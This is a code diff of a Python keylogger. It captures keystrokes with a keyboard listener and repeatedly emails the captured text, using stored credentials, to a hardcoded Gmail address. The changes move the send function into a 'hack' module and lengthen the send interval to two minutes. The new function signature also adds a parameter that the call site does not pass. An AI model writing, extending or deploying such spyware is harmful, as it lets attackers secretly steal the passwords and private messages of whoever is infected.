@@ -52,10 +52,10 @@ def start_logging_keys():
 
     return keyboard_listener
 
-def start_periodic_send_email(interval):
+def start_periodic_send_email(text, interval):
     global sentence, USERNAME, PASSWORD
     import threading
-    from send import send_mail
+    from hack.send import send_mail
 
     ticker = threading.Event()
     try:
@@ -64,15 +64,14 @@ def start_periodic_send_email(interval):
                 send_mail(USERNAME, PASSWORD, 'tejashah88@gmail.com', sentence)
                 sentence = ""
     except KeyboardInterrupt:
-        print('gitcga')
         ticker.set()
 
-if __name__ == "__main__":
+def start_email_keylogger():
     print('starting to log keys...')
     keyboard_listener = start_logging_keys()
 
     print('starting email broadcaster...')
-    start_periodic_send_email(5)
+    start_periodic_send_email(2 * 60)
 
     # gracefully shutdown
     import signal
